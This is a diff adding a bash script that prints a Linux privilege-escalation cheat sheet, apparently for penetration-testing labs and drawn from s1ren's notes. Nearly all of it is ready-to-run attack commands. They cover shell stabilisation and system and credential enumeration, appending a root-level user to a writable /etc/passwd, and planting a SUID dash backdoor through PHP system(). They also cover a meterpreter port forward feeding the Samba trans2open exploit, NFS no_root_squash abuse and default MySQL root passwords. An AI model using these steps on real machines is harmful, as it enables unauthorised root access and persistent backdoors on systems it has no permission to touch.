@@ -1,0 +1,226 @@
+#!/bin/bash
+Notes Taken from s1ren
+https://sirensecurity.io/blog/linux-privilege-escalation-resources/
+
+bold=$(tput bold)
+normal=$(tput sgr0)
+Blue='\033[1;94m'
+Red='\033[1;101m'
+
+
+printf "\n\n\n"
+printf "%0.s=" {1..79}
+printf "\n\n$Blue[+ I just got a low-priv shell !]${normal}\n"
+printf "python -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
+printf "OR\n"
+printf "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
+printf "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp\n"
+printf "export TERM=xterm-256color\n"
+printf "alias ll='ls -lsaht --color=auto'\n"
+printf "Ctrl + Z [Background Process]\n"
+printf "stty raw -echo ; fg ; reset\n"
+printf "stty columns 200 rows 200\n\n"
+
+printf "%0.s=" {1..79}
+printf "\n\n$Blue[+ Kernal Payloads (Last Resort but notable information)]${normal}\n"
+printf "$Blue[++ What Arch?]${normal}\n"
+printf "file /bin/bash\n"
+printf "$Blue[++ Kernal]${normal}\n"
+printf "uname -a\n"
+printf "$Blue[++ Issue/Release?]${normal}\n"
+printf "cat /etc/*-release\n"
+printf "cat /etc/issue\n\n"
+
+printf "%0.s=" {1..79}
+
+printf "\n\n$Blue[+ Are we a real user?]${normal}\n"
+printf "sudo -l\n"
+printf "ls -lsaht /etc/sudoers\n\n"
+
+printf "%0.s=" {1..79}
+
+printf "\n\n$Blue[+ Are any users a member of exotic groups?]${normal}\n"
+printf "groups <user>\n\n"
+
+printf "%0.s=" {1..79}
+
+printf "\n\n$Blue[+ Check out shell's environmental variables]${normal}\n"
+printf "env\n"
+printf "$Red https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/${normal}\n\n"
+
+printf "%0.s=" {1..79}
+
+printf "\n\n$Blue[+ Users?]${normal}\n"
+printf "ls -lsaR /home/ 2>/dev/null\n"
+printf "$Red .Mozzila directory could be used to pull credentials${normal}\n"
+printf "$Red Any .conf files? ssh keys? Interesting files?${normal}\n\n"
+
+printf "%0.s=" {1..79}
+
+printf "\n\n$Blue[+ Check */www for interesting files/directories: Web Configs Containing credentials?]${normal}\n"
+printf "ls -lsaht /var/www\n\n"
+
+printf "$Blue[+ Check */www/html for interesting files/directories: Web Configs containing credentials]${normal}\n"
+printf "ls -lsaht /var/www/html\n\n"
+
+printf "%0.s=" {1..79}
+
+printf "\n\n$Blue[+ SUID Binaries?]${normal}\n"
+printf "find / -perm -u=s -type f 2>/dev/null\n"
+printf "$Red Use https://gtfobins.github.io/ to help exploit${normal}\n\n"
+printf "$Blue[+ GUID Binaries?]${normal}\n"
+printf "find / -perm -g=s -type f 2>/dev/null\n\n"
+
+printf "%0.s=" {1..79}
+printf "\n\n$Blue[+ Quick Look in]${normal}\n"
+printf "ls -lsaht /var/lib\n"
+printf "ls -lsaht /var/db\n"
+printf "ls -lsaht /opt/\n"
+printf "ls -lsaht /tmp/\n"
+printf "ls -lsaht /var/tmp/\n"
+printf "ls -lsaht /dev/shm/\n\n"
+
+printf "$Blue[+ Where can I live on this machine? Where can I read, write and execute files?]${normal}\n"
+printf "ls -lsaht /tmp/\n"
+printf "ls -lsaht /var/tmp/\n"
+printf "ls -lsaht /dev/shm/\n\n"
+
+printf "%0.s=" {1..79}
+
+printf "\n\n$Blue[+ any exotic file system mounts/extended attributes? (looking for it to say user extened attributes)]${normal}\n"
+printf "cat /etc/fstab\n"
+printf "mount\n\n"
+
+printf "%0.s=" {1..79}
+
+printf "\n\n$Blue[+ Check etc for anything special made by any user-level people]${normal}\n"
+printf "ls -lsaht /etc/\n"
+printf "$Red Looking for anything not root:root or root:shadow${normal}\n"
+printf "$Red Except: cups${normal}\n\n"
+
+printf "$Blue[+ Any .config files in /etc ?]${normal}\n"
+printf "ls -lsaht /etc/ |grep -i ‘.conf’ --color=auto\n\n"
+
+
+printf "$Blue[+ Any .secret files in /etc ?]${normal}\n"
+printf "ls -lsaht /etc/ |grep -i ‘.secret’ --color=auto\n\n"
+
+printf "$Blue[+ Is passwd writable?]${normal}\n"
+printf "ls -lsa /etc/passwd\n"
+printf "$Blue[++ Exploit writable passwd file]${normal}\n"
+printf "openssl passwd -1\n"
+printf "<Enter A Password>\n"
+printf "$Blue copy hash output${normal}\n"
+printf "echo 'offsec:<PASTE_HASH>:0:0:offsec:/home/offsec:/bin/bash' >> /etc/passwd\n"
+printf "su offsec\n"
+printf "id\n\n"
+
+printf "%0.s=" {1..79}
+
+printf "\n\n$Blue[+ Cron]${normal}\n"
+printf "crontab –u root –l\n\n"
+
+printf "$Blue[+ Unusual System-Wide Cron Jobs]${normal}\n"
+printf "ls -lsa /etc/cron*\n"
+printf "cat /etc/crontab\n"
+printf "crontab -l\n\n"
+
+printf "$Blue[+ Using pspy on system]${normal}\n"
+printf "cd /var/tmp\n"
+printf "transfer pyspy32 or 64 over to /var/tmp\n"
+printf "./pspy32\n"
+printf "./pspy64\n\n"
+
+printf "%0.s=" {1..79}
+
+printf "\n\n$Blue[+ What does the local network look like? Looking for 127.0.0.1 Running a port that was not found during nmap]${normal}\n"
+printf "netstat -antup\n"
+printf "netstat -tunlp\n\n"
+
+printf "$Blue[+ Forwarding out a weak service for root priv (with meterpreter!) Example: netbios-ssn]${normal}\n"
+printf "$Red Do we need to get a meterpreter shell and forward out some ports that might be running off of the Loopback${normal}\n"
+printf "$Red Adaptor (127.0.0.1) and forward them to any (0.0.0.0)? If I see something like Samba SMBD out of date on${normal}\n"
+printf "$Red 127.0.0.1 - we should look to forward out the port and then run trans2open on our own machine at the${normal}\n"
+printf "$Red forwarded port.${normal}\n"
+printf "$Red https://www.offensive-security.com/metasploit-unleashed/portfwd/${normal}\n"
+printf "$Blue[meterpreter]${normal}portfwd add –l 139 –p 139 –r [target remote host]\n"
+printf "$Blue[meterpreter]${normal}background\n"
+printf "use exploit/linux/samba/trans2open\n"
+printf "set RHOST 0.0.0.0\n"
+printf "set RPORT 139\n\n"
+
+printf "%0.s=" {1..79}
+
+printf "\n\n$Blue[+ Is anything vulnerable running as root?]${normal}\n"
+printf "ps aux |grep -i 'root' --color=auto\n\n"
+
+printf "%0.s=" {1..79}
+
+printf "\n\n$Blue[+ Any Mail?]${normal}\n"
+printf "ls -lsaht /var/mail\n\n"
+
+printf "%0.s=" {1..79}
+
+printf "\n\n$Blue[+ Get Granted/Implicit (Required by a Real User) Capabilities of all files recursively throughout the system and pipe all error messages to /dev/null.]${normal}\n"
+printf "getcap -r / 2>/dev/null\n"
+printf "$Red https://www.insecure.ws/linux/getcap_setcap.html#getcap-setcap-and-file-capabilities${normal}\n\n"
+
+printf "%0.s=" {1..79}
+
+printf "\n\n$Blue[+ With file that has root priv but you are able to write and execute, we can exploit bash]${normal}\n"
+printf "PHP: system(\"cp /bin/dash /var/tmp/dash ; chmod u+s /var/tmp/dash\");\n"
+printf "$Blue[++ Execute File]${normal}\n"
+printf "/var/tmp/dash -p\n\n"
+
+printf "%0.s=" {1..79}
+
+printf "\n\n$Blue[+ File Transfer Capabilities]${normal}\n"
+printf "which wget\n"
+printf "which curl\n"
+printf "which nc\n"
+printf "which fetch (BSD)\n"
+printf "ls -lsaht /bin/ |grep -i 'ftp' --color=auto\n\n"
+
+
+printf "$Blue[+ Other Machine Capabilities]${normal}\n"
+printf "which gcc\n"
+printf "which cc\n"
+printf "which python\n"
+printf "which perl\n"
+printf "which ncat\n"
+printf "which nc.traditional\n"
+printf "which socat\n\n"
+
+printf "%0.s=" {1..79}
+
+printf "\n\n$Blue[+ MYSQL Credentials? Root Unautorized Access?]${normal}\n"
+printf "mysql -u root -p\n"
+printf "$Blue[++ Password Options]${normal}\n"
+printf "root\n"
+printf "toor\n"
+printf "<blank>\n\n"
+
+printf "%0.s=" {1..79}
+
+printf "\n\n$Blue[+ Can we exploit weak NFS Permissions?]${normal}\n"
+printf "cat /etc/exports\n"
+printf "$Blue[++ Look for following setting]${normal}\n"
+printf "no_root_squash\n"
+printf "$Red https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe/${normal}\n"
+printf "$Blue[++ ATTACK Machine]${normal}\n"
+printf "mkdir -p /mnt/nfs/\n"
+printf "mount -t nfs -o vers=<version 1,2,3> $IP:<NFS Share> /mnt/nfs/ -nolock\n"
+printf "gcc suid.c -o suid\n"
+printf "cp suid /mnt/nfs/\n"
+printf "chmod u+s /mnt/nfs/suid\n"
+printf "su <user id matching target machine's user-level privilege.>\n"
+printf "$Blue[++ Victim Machine]${normal}\n"
+printf "./suid\n\n"
+
+printf "%0.s=" {1..79}
+
+printf "\n\n$Blue[+ Find every single file ever created by user]${normal}\n"
+printf "find / -user <USER_NAME> 2>/dev/null\n\n"
+
+printf "%0.s=" {1..79}
+                      
